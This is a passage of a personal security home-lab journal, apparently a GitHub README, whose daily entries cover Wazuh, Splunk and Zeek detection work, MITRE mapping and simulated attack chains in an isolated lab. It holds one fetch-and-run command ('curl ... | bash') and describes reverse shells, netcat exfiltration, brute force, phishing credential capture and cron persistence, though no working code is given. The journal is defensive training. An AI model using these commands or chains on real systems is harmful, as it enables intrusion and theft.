- Automation scripts depending on SSH now work smoothly.


## 📡 2. Automatic PCAP Sync Working Perfectly

The script sync_latest_capture.sh now:

- Detects the newest .pcap file.
- Transfers it automatically to the host.
- Uses SSH key auth → no password required.
- Writes transfer logs correctly.


## ⚔️ 3. Full HTTP-Based Malware Attack Chain (Kali → PC2)

A complete multi-stage attack was executed:

1. Hosted malicious files (`helper1.sh`, `payload1.sh`) on Kali.
2. PC2 executed:
     curl http://192... | bash
   3. Helper script downloaded & ran payload.
4. Reverse shell opened on port 4444.
5. Fake secret data was created.
6. Exfiltration performed via port 9001.


## 🌐 4. PCAP and Zeek Logs Confirmed

Captured:

- HTTP requests
- Reverse shell traffic
- Exfiltration packets

Zeek logs forwarded:

- conn.log
- http.log
- dns.log


## ⚠️ 5. TA-Zeek Installed but Field Extraction Not Working

- Add-on installed.
- Forwarder sending zeek logs.
- Problem: Splunk shows TSV, no field extraction.


## 📘 6. Theory Study — THM SOC Level 1 (1.5 hours)

Covered SOC fundamentals, alerts, network logs, etc.


# ✅ Final Summary

✔ SSH automation fixed  
✔ Auto PCAP sync fully operational  
✔ Full malware → reverse shell attack completed  
✔ PCAP + Zeek captured  
✔ Forwarder works  
❗ TA-Zeek normalization missing  
✔ THM study done

<img width="5760" height="1080" alt="Screenshot from 2025-11-28 12-49-52" src="https://github.com/user-attachments/assets/222bd37c-fdd5-4cc2-b8fd-25a811a0a337" />
<img width="5760" height="1080" alt="Screenshot from 2025-11-28 12-48-56" src="https://github.com/user-attachments/assets/a67a8460-51c9-4f05-985c-63b72c080fc7" />
<img width="5760" height="1080" alt="Screenshot from 2025-11-28 12-48-30" src="https://github.com/user-attachments/assets/ead32fb8-70dd-4a6e-845f-e54baef3dd00" />
<img width="5760" height="1080" alt="Screenshot from 2025-11-28 12-46-18" src="https://github.com/user-attachments/assets/ea7b5587-38a3-4c70-bdec-1c209c0f2069" />
<img width="5760" height="1080" alt="Screenshot from 2025-11-28 12-37-09" src="https://github.com/user-attachments/assets/06284575-5987-4854-87ab-284811996c97" />
<img width="5760" height="1080" alt="splunkwireshark" src="https://github.com/user-attachments/assets/d28e975f-f59e-4e04-86de-7c7295e16bf1" />
<img width="5760" height="1080" alt="splunk" src="https://github.com/user-attachments/assets/4502a1c4-2f4f-457e-be15-93268465ea2a" />
<img width="5760" height="1080" alt="Screenshot from 2025-11-28 12-54-46" src="https://github.com/user-attachments/assets/98ad0b83-29c6-4315-ae1a-db526f3094d5" />



## Day 40 - New day - new experience
Date: November 30, 2025  

Today was one of the longest and most intense work sessions in my entire SOC Home Lab journey. I spent 8 full hours configuring, testing, troubleshooting, breaking, fixing, and validating multiple components of my offline environment. Even with unexpected issues, the session ended successfully with valuable experience gained.

## 🔧 1. Wazuh Agent & System Recovery

### 🔥 Critical Issue: /etc/passwd Corruption  
While testing a command, the system attempted to overwrite /etc/passwd, causing:
- Loss of user account visibility  
- sudo failing with “you do not exist in the passwd database”  
- Wazuh agent failing to start (“Invalid user 'wazuh' or group 'wazuh'”)  
- SSH refusing connections  
- System booting into read-only recovery mode

### 🛠 Recovery Steps
I fully recovered PC2 using real sysadmin techniques:
- Booted into Recovery Mode
- Remounted filesystem:
- Restored:
- /etc/passwd from /etc/passwd-
- /etc/shadow from /etc/shadow-
- Repaired file permissions  
- Rebooted successfully  
- Confirmed working login + sudo access  
- Restarted and verified Wazuh agent

This was a very realistic real-world troubleshooting experience, similar to what SOC/IT teams face during incidents.

## 🌐 2. Network & Device Stabilization

- Raspberry Pi reverted to DHCP; reconfigured to static 192.168.1.18
- Verified all hosts inside the offline lab:
- Kali  
- PC2  
- Pi  
- ThinkPad  
- Proxmox VMs  
- Ensured proper communication between devices  
- Confirmed SSH functionality and Splunk/Wazuh connectivity

## 🛡 3. Attack Simulations & Detection Testing

Performed multiple attack steps to generate security alerts:

### ✔ SSH Brute Force Simulation  
Detected in Wazuh as:
- Failed password attempts  
- Authentication failures  
- Credential guessing  
- MITRE mappings: T1110 (Brute Force)

### ✔ Web Server Probing  
Tested via browser/manual requests (404 / 405 error generation).  
Wazuh detected:
- Apache access logs  
- Web error codes  
- Nmap Scripting Engine user-agent  
- MITRE mapping: Initial Access → Reconnaissance

### ✔ Unauthorized Command Execution Detection  
Executed:

Wazuh correctly flagged it as:
- Privilege escalation attempt  
- Unauthorized system file modification  
- “First time user executed sudo”  
- MITRE mappings:  
  - Credential Access  
  - Persistence  
  - Privilege Escalation  
  - Lateral Movement

### 📊 Confirmed all logs are visible under:
- wazuh-alerts-*

This validated that the agent fully works after restoration.


## 📈 4. Real SOC-Level Learning

- Real-world troubleshooting  
- Full OS recovery  
- Understanding sensitive system files  
- Wazuh agent behavior  
- Log generation  
- Event correlation  
- Attack chain visibility  
- Hands-on SIEM workflow


## 📝 5. Final Notes

Today I achieved deep technical progress across:
- System administration  
- Wazuh configuration  
- Log analysis  
- Offense/Defense testing  
- Network stability  
- Incident recovery  
- Attack chain documentation

Even after breaking part of the system, I successfully restored everything and continued working until the lab was fully operational again.

Tomorrow’s goals:
- Add missing auditd/sysmon monitoring rules in Wazuh  
- Create structured attack chain documentation  
- Trigger new events and analyze them  
- Prepare notes for future SOC interviews

<img width="3840" height="1080" alt="Screenshot from 2025-11-30 16-43-54" src="https://github.com/user-attachments/assets/1384efbd-567b-4602-be3e-5c427d862c13" />
<img width="5760" height="1080" alt="Screenshot from 2025-11-30 17-03-18" src="https://github.com/user-attachments/assets/81f5e962-acd3-460e-a915-e9272d41a3ca" />
<img width="5760" height="1080" alt="bruteforce" src="https://github.com/user-attachments/assets/8da4f551-de0c-43d4-8253-79367de54eec" />
<img width="5760" height="1080" alt="nmap" src="https://github.com/user-attachments/assets/f6494e8b-507a-46f6-a91a-f1ec1f85ba5d" />
<img width="5760" height="1080" alt="escal" src="https://github.com/user-attachments/assets/c6d7e7b4-0cbe-42a9-923b-cf8f753e2b79" />
<img width="5760" height="1080" alt="ex" src="https://github.com/user-attachments/assets/4ee9fea3-9ce4-4d8c-8e10-c51043776e51" />

## Day 41 - MITRE
Date: December 1, 2025
  
I spent many hours working on Wazuh rule customization, trying to map my simulated attack chain to the MITRE ATT&CK framework using custom local_rules.xml.

### 🔧 What I worked on
- Troubleshooting Wazuh configuration errors caused by invalid XML syntax.
- Learning how the manager validates rules and rejects incorrect attributes.
- Successfully updating the Wazuh repository and verifying version integrity.
- Creating and testing my first working custom MITRE rule for detecting cron persistence:
  - Technique: T1053.003 (Cron)
  - Triggered correctly after simulating a malicious cron modification.
- Investigated other attack steps: netcat exfiltration, SSH intrusion, privilege escalation.
- Identified which techniques require:
  - Custom decoders  
  - Regex adjustments  
  - Or deeper log visibility

### 🧪 Attack chain tested today
I executed a full attack simulation:
- Nmap scan from Kali  
- SSH intrusion  
- Privilege escalation  
- Cron persistence backdoor  
- Data exfiltration with nc  

Wazuh successfully detected:
- SSH login activity  
- Sudo privilege changes  
- Cron-based persistence (custom rule working!)  

Still pending detection:
- Netcat exfiltration (T1048)  
- Some lateral movement and manipulation steps

### 🧠 What I learned
- Wazuh is extremely strict with XML — one wrong tag breaks the entire manager.
- MITRE mappings must follow the correct <mitre><id>…</id></mitre> format.
- Custom detection is possible, but it requires:
  - Understanding how Wazuh decoders parse logs  
  - Matching the right SID  
  - Building rules step-by-step, testing each one  

### 📌 Next steps (Tomorrow)
- Create reliable custom rules for:
  - T1048 — Data Exfiltration (Netcat)
  - Additional privilege escalation steps
  - Command monitoring for attacker TTPs  
- Add missing log visibility on PC2 for better detection.  
- Build a clean set of reusable MITRE rules for future attacks.

Despite how exhausting today was, I finished with a working MITRE rule and a better understanding of Wazuh internals.

<img width="5760" height="1080" alt="hydra1-12" src="https://github.com/user-attachments/assets/e56c0c76-0212-4773-9b25-42d2305a0481" />
<img width="5760" height="1080" alt="Screenshot from 2025-12-01 12-32-45" src="https://github.com/user-attachments/assets/1f8b3be0-6cc4-4a57-9477-8877fec9055f" />
<img width="5760" height="1080" alt="Screenshot from 2025-12-01 13-12-45" src="https://github.com/user-attachments/assets/8e27a6c8-1207-4409-807e-298e12d5dfd0" />
<img width="5760" height="1080" alt="Screenshot from 2025-12-01 19-08-28" src="https://github.com/user-attachments/assets/c2d4c211-95a9-454a-8f69-29407982ec37" />
<img width="5760" height="1080" alt="Screenshot from 2025-12-01 19-09-58" src="https://github.com/user-attachments/assets/21a24949-8943-4023-8f6c-aeffd30a4b5e" />


## Day 42 - First Report
Date: December 2, 2025

Today was one of the most productive sessions in my SOC Level 1 training so far. I completed a full end-to-end attack chain inside my offline SOC lab, validated traffic visibility across all layers, tested detections in Splunk and Wazuh, collected network forensics using Zeek and Wireshark, and finished my first complete SOC incident report based on real evidence.

This session combined offensive testing + defensive monitoring + forensic analysis + reporting, giving me a complete real-world SOC workflow experience.


## 🔥 1. Attack Chain Execution (Kali → PC2 Ubuntu)

I executed the full chain from the attacker machine (Kali 192.168.1.) against PC2 (192.168.1.), all performed inside my isolated home lab.

## Steps executed:
 
 • Nmap network discovery (T1046)
 • Nmap service scan (T1046/T1045)
 • Hydra SSH brute-force on PC2 (T1110)
 • Successful SSH login using brute-forced credentials (T1078)
 • Sudo privilege escalation check (T1069)
 • Malicious file download using wget (T1105)
 • Data exfiltration using curl HTTP POST (T1041)

## 📡 2. Capture & Monitoring Setup (Zeek, tcpdump, Wireshark)

Before starting the attack, I launched:
 • Zeek on my Raspberry Pi sensor to capture structured logs
 • tcpdump to record a full PCAP for Wireshark analysis
 • Wireshark later to analyze encrypted SSH, Nmap phases, HTTP GET/POST, and connections

## 📊 3. SIEM Visibility (Splunk)

Splunk received logs from PC2 and correctly indexed all major stages:
 • Failed SSH logins (Hydra brute-force)
 • Successful SSH login by attacker
 • sudo activity performed after compromise
 • wget download visible from shell history + syslog
 • curl exfiltration also visible
 • Timestamps aligned with Zeek and Wireshark data

## 🛡️ 4. Wazuh Visibility (Host-Based Detection)

Wazuh detected several important parts of the attack chain:
 • SSH brute-force attempts
 • Successful SSH authentication
 • sudo privilege escalation attempt
 • wget / curl command execution logs

Some parts (like exfiltration detection, Nmap, persistence, or tool transfer details) require custom rule creation, which I will configure in future sessions.

## 🔍 5. Forensic Analysis (Wireshark + Zeek Logs)

In Wireshark I analyzed:
 • Nmap scan patterns (SYN, ICMP, ARP)
 • SSH brute-force handshake loops
 • Full SSH session establishment
 • HTTP GET request for payload download
 • HTTP POST exfiltration including visible payload size
 • Packet length, streams, seq/ack timeline

Zeek validated all of this with:
 • conn.log: connection states and timing
 • http.log: GET and POST events
 • ssh.log: authentication attempts
 • notice.log: scanning behaviors (where applicable)

## 🧩 6. MITRE Technique Mapping

I mapped every stage to ATT&CK:
 • T1046 — Network Discovery
 • T1110 — Brute Force
 • T1078 — Valid Accounts
 • T1069 — Privilege Escalation
 • T1105 — Ingress Tool Transfer
 • T1041 — Data Exfiltration Over C2/HTTP

## 📝 7. Reporting Work

I wrote my first complete SOC incident report, including:
 • Executive summary
 • Full timeline
 • MITRE mapping
 • Splunk findings
 • Wazuh detections
 • Zeek + Wireshark evidence
 • Impact analysis
 • Recommendations

This report is ready for LinkedIn

<img width="5760" height="1080" alt="payload16" src="https://github.com/user-attachments/assets/0fb41e62-19e9-4c7b-b1c9-2e42c1eaf734" />
<img width="5760" height="1080" alt="sshdone" src="https://github.com/user-attachments/assets/e7effac2-d607-4d4b-a692-8898c5b688be" />
<img width="5760" height="1080" alt="hydra16" src="https://github.com/user-attachments/assets/499a137e-c6c1-4aac-bd0a-98c6cef3383e" />
<img width="5760" height="1080" alt="nmap17" src="https://github.com/user-attachments/assets/a88fba0b-b881-4508-91aa-7d32164ae14b" />
<img width="5760" height="1080" alt="startcapt" src="https://github.com/user-attachments/assets/65ba6fc7-4e19-4210-b517-8a5c46db51ca" />

## Day 43 - Attack Chain + Wazuh Fix + Custom Detections
Date: December 6, 2025

### 1️⃣ Attack Chain Executed
- Nmap recon and service discovery  
- SSH brute-force simulation (Hydra)  
- Successful SSH access  
- Post-compromise commands (bash, wget, curl)  
- Data exfiltration test  
- Traffic captured and analyzed in Wireshark + Splunk  

### 2️⃣ Initial Detection Issues
- Wazuh not showing alerts  
- auditd logs missing or incomplete  
- local_rules.xml syntax errors  
- Custom rules not loading  
- No MITRE mapping visible  

### 3️⃣ Fixes Performed
- Rebuilt local_rules.xml with correct XML structure  
- Added MITRE tags, rule groups, descriptions  
- Removed invalid regex and simplified matching  
- Restarted Wazuh Manager → no errors in ossec.log  
- Confirmed custom rules load correctly  

### 4️⃣ Custom Rule Detections Working
Wazuh now generates alerts for:
- Suspicious command execution (`wget`, curl, `python3`) → MITRE T1059  
- Netcat exfiltration rule structure functional → MITRE T1048  
- Cron persistence rule loaded → MITRE T1053.003  

Alerts appear in wazuh-alerts-* with:
- rule.id  
- rule.level  
- rule.description  
- MITRE technique metadata  
- Full audit/command log context  

### 5️⃣ Key Takeaways
- auditd parent SIDs must trigger before custom rules  
- XML errors break the entire ruleset  
- Netcat may not produce audit logs → needs separate detection method  
- First successful custom Wazuh detections working end-to-end

<img width="5760" height="1080" alt="rules" src="https://github.com/user-attachments/assets/ac5d2327-86f0-4759-93dd-2a5bfb270c2a" />
<img width="5760" height="1080" alt="sshcon" src="https://github.com/user-attachments/assets/d8056579-342d-49e8-b249-4e7f1a106ac2" />
<img width="5760" height="1080" alt="exfil01" src="https://github.com/user-attachments/assets/9efa33da-9766-4db3-a600-307acd4e90fa" />

## Day 44 - Full end-to-end attack chain
Date: December 9, 2025


Today I completed a full end-to-end attack chain in my isolated SOC home lab, covering all major phases of a realistic intrusion: recon → brute force → valid access → file transfer → local execution → lateral movement → exfiltration → persistence.  
This session helped me understand not only how an attacker moves but also how each stage appears in Wazuh, Splunk and Wireshark, giving me a full multi-layered view of detection engineering.

## 🔍 What I accomplished today
- Performed Nmap reconnaissance against my victim machine and confirmed detection across Wireshark, Splunk (`auth.log`, `apache2 logs`) and Wazuh (scan behavior via web enumeration).
- Simulated SSH brute-force with Hydra and analyzed the pattern of failed → successful login attempts in Wazuh and Splunk.
- Achieved valid access (T1078) and captured the SSH session establishment in Wireshark with full packet inspection.
- Identified and documented a potential ingress tool transfer (T1105) via additional SSH connection from Kali → PC2, observing the activity in Splunk, Wazuh session logs, and network traces.
- Executed my simulated malicious script on PC2 (`/tmp/script.sh`) and mapped it to T1059 Command Execution, analyzing how my audit logs and Wazuh custom rule responded.
- Performed lateral movement attempts from PC2 to another internal machine (.133), capturing outbound SSH attempts in Wireshark and Splunk’s authentication logs.
- Simulated exfiltration (nc + curl + python HTTP server) and confirmed detection in Wireshark and Splunk; Wazuh also captured custom-rule triggers.
- Created a cron persistence mechanism (T1053.003) on PC2 and verified it through Wazuh FIM/audit logs.

## 🧠 Learning outcomes
- I practiced building a coherent attack timeline and validated how each action creates specific log artifacts across the environment.  
- I confirmed that each tool (Nmap, Hydra, SSH, SCP, nc, curl) leaves different network and host-level fingerprints that can be correlated.
- I strengthened my ability to troubleshoot and interpret audit logs, network flows, and SIEM detections.
- I verified which parts of the chain triggered detections and which required improved rules — perfect preparation for tomorrow’s exercises.
- The full chain took around 4 hours, matching a realistic incident-response workflow: investigation, correlation, verification, and report preparation.

<img width="5760" height="1080" alt="Screenshot from 2025-12-09 11-15-41" src="https://github.com/user-attachments/assets/66045d81-f290-403f-9c05-1d7c22164a96" />
<img width="5760" height="1080" alt="scp1" src="https://github.com/user-attachments/assets/b6a44c70-8e1f-44b1-8b04-dc5abe276a99" />
<img width="5760" height="1080" alt="Screenshot from 2025-12-09 11-49-10" src="https://github.com/user-attachments/assets/38706187-4da2-4df1-b00e-42044b904eb7" />

## Day 45 - SOC Home Lab Practice (Phishing)
Date: December 10, 2025

### Overview
Today I continued expanding the realism of my SOC home lab by working on phishing-simulation tools, credential harvesting workflows, and resolving Raspberry Pi network issues to restore my packet-capture sensor. No offensive execution yet — today was focused on setup, validation, and preparing the environment for tomorrow’s full phishing, keylogging, and MITM chains.

## 1. Phishing Framework Setup (MITRE T1566 – Phishing)
- Installed a templated phishing page environment.
- Started testing a fake login page to understand how credential POST traffic looks in Wireshark.
- Verified that captured traffic shows the HTTP POST request with username/password, which will be used later for correlation in Splunk/Wazuh.
- Prepared directory structure for harvesting logs.

Detection Insight:  
Focus tomorrow on:
- Monitoring HTTP POST patterns  
- Detecting unusual internal web servers  
- Flagging connections from victim machines to suspicious local IPs  

MITRE: T1566.002 (Spearphishing via Link)

## 2. Raspberry Pi 4 – Network Sensor Fix
- Spent almost 2 hours troubleshooting Pi’s Ethernet not connecting.
- Issue was caused by IP conflict (same IP used on eno1 by the server).
- Resolved by:
  - Resetting network config  
  - Assigning a fresh dynamic IP  
  - Rebooting server and Pi  
- Pi is now back online and capturing packets normally.

Detection Insight:  
Pi connectivity issues can break:
- live Zeek/tcpdump capture  
- MITM tests  
- phishing credential harvesting visibility 

## Tools Validated Today
- Wireshark (packet analysis)
- Local phishing page (HTML/JS template)
- Raspberry Pi capture interface

Splunk on Pi still needs fixes — will revisit after phishing chain.

![photo_2025-12-12_21-24-12](https://github.com/user-attachments/assets/7b9a4a64-8c33-485b-9b2b-060245fcbc69)
![photo_2025-12-12_21-20-18](https://github.com/user-attachments/assets/681e3670-d72c-47f0-9a63-2d3f3714eb9c)
![photo_2025-12-12_21-20-30](https://github.com/user-attachments/assets/02f616d6-242a-4956-b713-ecbdedcb83d2)
![photo_2025-12-12_21-20-23](https://github.com/user-attachments/assets/9d75b572-3ce9-4710-a8b0-a16697110b99)


## Day 46 - MITM Practice
December 11, 2025 

During this session, I practiced a Man-in-the-Middle (MITM) attack inside my fully offline home lab using only my own machines and an isolated network. The goal was not exploitation, but understanding how MITM activity looks from a detection and investigation perspective.

I simulated ARP-based MITM traffic between a victim host and the network gateway and observed the behavior across different telemetry sources.

### 1. Key Observations

- Network traffic was successfully redirected through the attacker machine, creating abnormal communication paths.
- HTTP sessions showed unexpected redirects, repeated TCP retransmissions, and connection resets.
- DNS and HTTP traffic patterns deviated from normal baseline behavior.
- From the victim’s perspective, browsing appeared mostly normal, which highlights why MITM is difficult to detect without visibility.

### 2. Detection & Analysis

- Wireshark:  
  Identified ARP poisoning indicators, duplicated ARP replies, unusual TCP retransmissions, and HTTP 30x redirects pointing to unexpected internal hosts.
- Zeek:  
  Logs captured abnormal connection behavior, HTTP status anomalies, and unexpected DNS resolution paths.
- Splunk:  
  Correlating Zeek logs made it easier to spot repeated redirects, abnormal session behavior, and inconsistent source/destination relationships over time.

### 3. SOC Perspective Takeaways

- MITM attacks often leave behavioral indicators, not obvious alerts.
- Detection relies heavily on baseline knowledge of normal network behavior.
- Correlation between packet-level data (Wireshark) and log-level data (Zeek + Splunk) is critical.
- MITM is best detected through network anomalies, not endpoint alerts alone.

### 4.MITRE ATT&CK Mapping

- T1557 — Adversary-in-the-Middle
- T1040 — Network Sniffing

<img width="1913" height="1071" alt="mitm" src="https://github.com/user-attachments/assets/e6a0f95e-7c56-4125-94e5-45ee3b478ff5" />
<img width="1915" height="1046" alt="ph" src="https://github.com/user-attachments/assets/ea5bd2bb-89a7-4080-b9a0-2e68c3a2168d" />

### Day 47 - Attack Chain 1
Date: December 14, 2025

I completed a full six-phase attack chain simulation in my SOC home lab, starting from initial access and ending with data exfiltration. The chain began with a phishing-style delivery where the victim downloaded a file over HTTP, which maps to MITRE ATT&CK T1566 (Phishing) and was visible in network traffic. After delivery, the payload was executed on the victim system, corresponding to T1059 (Command and Scripting Interpreter), although visibility at this stage was limited due to the lack of endpoint telemetry.

Following execution, the compromised host established a reverse shell back to the attacker on TCP port 4444, representing command-and-control activity mapped to T1071 (Application Layer Protocol). After gaining interactive access, I implemented persistence using a cron job on the victim host, which aligns with T1053.003 (Scheduled Task / Cron) and resulted in automated execution without user interaction. Once persistence was established, the host began periodic HTTP beaconing, generating repeated outbound HTTP requests that clearly demonstrated low-noise C2 behavior and mapped to T1071.001 (Web Protocols).

In the final phase, I exfiltrated data from the victim to the attacker over TCP port 5555 using netcat, which maps to T1041 (Exfiltration Over C2 Channel) and was confirmed through Splunk and network metadata. After completing the chain, I removed the cron persistence and verified that all recurring activity stopped. This session helped me practice executing, detecting, and documenting a complete end-to-end attack chain while applying accurate MITRE ATT&CK mappings to each phase.

<img width="3838" height="1070" alt="ph6" src="https://github.com/user-attachments/assets/8c2ae002-562f-49e2-81f3-fe173f2a56f1" />
<img width="3842" height="1048" alt="ph5" src="https://github.com/user-attachments/assets/acdd91aa-9c71-463a-84d5-f204d386385e" />
<img width="3842" height="1077" alt="ph4" src="https://github.com/user-attachments/assets/d12d6ffb-1ecd-4dc3-8507-2c006b24f5e7" />
<img width="3836" height="1079" alt="ph3" src="https://github.com/user-attachments/assets/9520f7f5-50ca-4164-8930-d77808fc63a5" />
<img width="5760" height="1080" alt="1ph" src="https://github.com/user-attachments/assets/fa8e1f5f-f0ba-476e-b681-c0c5af7f19ae" />

### Day 48 - Attack Chain 2
Date: December 15, 2025

Yesterday I completed a full SSH-based attack chain in my SOC home lab, starting from reconnaissance and ending with data exfiltration. The chain began with network reconnaissance against the victim host, where scanning activity was observed and mapped to MITRE ATT&CK T1046 (Network Service Discovery). After identifying SSH as an exposed service, I performed an automated SSH brute-force attack using Hydra, which generated a high volume of authentication attempts and maps to T1110 (Brute Force).

Following the brute-force phase, valid credentials were successfully obtained and used to authenticate to the victim system over SSH, corresponding to T1078 (Valid Accounts). After successful authentication, I observed post-authentication activity over an encrypted SSH session, where command execution was inferred based on session duration and traffic behavior, mapping to T1021.004 (Remote Services: SSH).

During the post-compromise phase, the compromised host generated additional outbound traffic, including DNS-related activity, which was investigated and classified as benign system behavior rather than attacker-driven communication. This helped reinforce the importance of validating events before mapping them to malicious techniques. In the final phase of the chain, data was exfiltrated from the victim to the attacker over a non-standard TCP port (5555) using netcat, which maps to T1041 (Exfiltration Over C2 Channel) and was clearly confirmed through Splunk and Zeek connection metadata.

Overall, this session allowed me to practice detecting an SSH-based intrusion end to end, correlating reconnaissance, credential access, valid login, post-authentication behavior, and exfiltration across Wireshark, Zeek, and Splunk. It also highlighted the challenges of working with encrypted traffic and reinforced the value of timing, metadata, and cross-tool correlation when reconstructing real attack chains.

### Day 49 - AA (Automated Attack) Chains & Detection Validation
Date: December 17, 2025

Automated Attack Chains & Detection Validation

Today I focused on automation, attack chaining, and detection validation inside my offline SOC home lab.

I successfully designed and executed two fully automated attack chains from the attacker (Kali) to the victim (Ubuntu), covering multiple phases of a realistic intrusion lifecycle. Each chain was built to generate both host-based and network-based telemetry for analysis in Splunk, Zeek, Wireshark, and audit logs.

### Key Achievements
- Built Chain 1 simulating execution, C2-style communication, HTTP beaconing, persistence (cron), and data exfiltration over TCP
- Built Chain 2 simulating SSH reconnaissance, brute force activity (Hydra), valid access via SSH key authentication, post-authentication actions, and data exfiltration
- Automated both chains with reusable Bash scripts to ensure repeatable detections
- Captured full PCAPs using Raspberry Pi with port mirroring enabled
- Verified network indicators in Wireshark (SYN scans, HTTP beaconing, C2/exfil traffic)
- Verified host-level indicators in Splunk (auth.log, auditd, cron activity, SSH events)
- Mapped attack behavior to MITRE ATT&CK techniques (Brute Force, Valid Accounts, Application Layer Protocol, Exfiltration Over C2 Channel, Scheduled Tasks)
- Validated that telemetry aligns correctly across network + host + SIEM layers

### Outcome
This session significantly improved my understanding of:
- How attack phases connect together in real workflows
- How automated attacks generate consistent, detectable patterns
- How defenders correlate logs, PCAPs, and timelines to reconstruct an intrusion

Both chains are now fully reproducible, providing a strong foundation for:
- Detection engineering
- Alert tuning
- SOC analyst investigation practice

<img width="3834" height="1070" alt="autochain" src="https://github.com/user-attachments/assets/74dcd384-433f-4308-8830-6545e37fe8bb" />
<img width="3834" height="1073" alt="autocaptchain1" src="https://github.com/user-attachments/assets/81dbb901-499c-48d1-bf35-4b36a9c78bbe" />
<img width="5760" height="1080" alt="autochain2" src="https://github.com/user-attachments/assets/bc404a76-f73e-4516-ad98-ca03b203ca6e" />
<img width="5760" height="1080" alt="automation" src="https://github.com/user-attachments/assets/7e36bdcf-6087-4c0a-aaca-ee8ff7a93732" />

